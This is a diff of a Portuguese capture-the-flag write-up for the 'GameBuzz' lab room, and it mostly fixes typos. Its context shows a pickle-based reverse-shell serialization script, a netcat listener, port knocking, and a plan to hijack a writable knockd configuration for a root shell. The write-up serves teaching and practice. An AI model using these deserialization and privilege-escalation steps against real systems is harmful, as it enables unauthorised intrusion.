@@ -52,9 +52,9 @@ Decidi analizar a requisição com o `BURP`.
 
 <img src="/thm/thm-gamebuzz-3.png">
 
-Aparentemento o link faz uma requisição para um objeto `serializado` para o endereço `/var/upload/games/`, talvez possamos utilizar um payload serializado, mas ainda não temos um vetor de entrada.
+Aparentemente o link faz uma requisição para um objeto `serializado` que se encontra  no endereço `/var/upload/games/`, talvez possamos utilizar um payload serializado, mas ainda não temos um vetor de entrada.
 
-A varedura de diretórios não revelou nada útil, então decidi fazer uma busca por subdomínios.
+A varredura de diretórios não revelou nada útil, então decidi fazer uma busca por subdomínios.
 
 ```
 ┌──(hastur㉿hastur)-[~/GameBuzz]
@@ -155,12 +155,12 @@ O gobuster trouxe o diretório `/upload`, ao acessá-lo, encontrei um formulári
 
 <img src="/thm/thm-gamebuzz-7.png">
 
-Como o diretório é `/upload` e a requisição do `Game Rattings` vai para o diretório `/var/upload/games`, tavlez estejamos falando do mesmo lugar, então decidi fazer um script em `python` para serializar um payload com reverse shell.
+Como o diretório é `/upload` e a requisição do `Game Ratings` vai para o diretório `/var/upload/games`, tavlez estejamos falando do mesmo lugar, então decidi fazer um script em `python` para serializar um payload com reverse shell.
 
 ```
 ┌──(hastur㉿hastur)-[~/GameBuzz]
 └─$ cat serialize.py 
-#!/usr/bin/env python3
+#!/usr/bin/python3
 
 import pickle, os
 
@@ -170,7 +170,7 @@ class SerializedPickle(object):
 
 pickle.dump(SerializedPickle(), open('hastur','wb'))
 ```
-Este script irá salvar nosso payload em um arquivo para podermos subí-lo pelo formulário,
+Este script irá salvar nosso payload em um arquivo para podermos subí-lo pelo formulário.
 
 ```
 ┌──(hastur㉿hastur)-[~/GameBuzz]
@@ -186,7 +186,7 @@ drwxr-xr-x 33 hastur hastur 4096 Sep 12 22:48 ..
 ```
 
 Setei um `netcat` para ouvir na porta 8443 e fiz upload do payload.
-Com o `BURP`, alterei a requisição do `Game Ratting` para o endereço do payload.
+Com o `BURP`, alterei a requisição do `Game Rating` para o endereço do payload.
 
 <img src="/thm/thm-gamebuzz-8.png">
 
@@ -244,7 +244,7 @@ cat knockd.conf
         command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
         tcpflags    = syn
 ```
-Ele nos diz que para abrir a porta 22, precisamos mandar uma requisição sequencial para as portas `5020, 6120 e 7340`, podemos usar o programa `knock` para abrirmos a porta 22 e tentar logar com o usuário `dev1`.
+Ele nos diz que para abrir a porta 22, precisamos mandar uma requisição sequencial com a flag `SYN` para as portas `5020, 6120 e 7340`, podemos usar o programa `knock` para abrirmos a porta 22 e tentar logar com o usuário `dev1`.
 
 ```
 ┌──(hastur㉿hastur)-[~/GameBuzz]
@@ -274,7 +274,7 @@ Ao enumerar o arquivo `/etc/knockd.conf` que já havíamos encontrado, descobri 
 dev1@incognito:~$ ls -la /etc/knockd.conf 
 -rw-rw-r--+ 1 root root 349 Jun 11 07:39 /etc/knockd.conf
 ```
-O `+` nas permissões, evidencia que o arquivo tem permissões adicionais, se conseguirmos editar este arquivo, podemos tentar um shell como `root`.
+O `+` nas permissões, evidencia que o arquivo tem permissões especiais, se conseguirmos editar este arquivo, podemos tentar um shell como `root`.
 
 ```
 dev1@incognito:~$ cat /etc/knockd.conf 
@@ -293,7 +293,7 @@ dev1@incognito:~$ cat /etc/knockd.conf
         command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
         tcpflags    = syn
 ```
-Novamente observando o arquivo, percebemos que logo após ele receber a sequência correta de requisições, ele roda um comando no `iptables`, iso significa que talves possamos editar esta linha para inserir um payload de conexão reversa.
+Novamente observando o arquivo, percebemos que logo após ele receber a sequência correta de requisições, ele roda um comando no `iptables`, iso significa que talvez possamos editar esta linha para inserir um payload de conexão reversa.
 Após a edição do arquivo, ficou desta forma : 
 
 ```
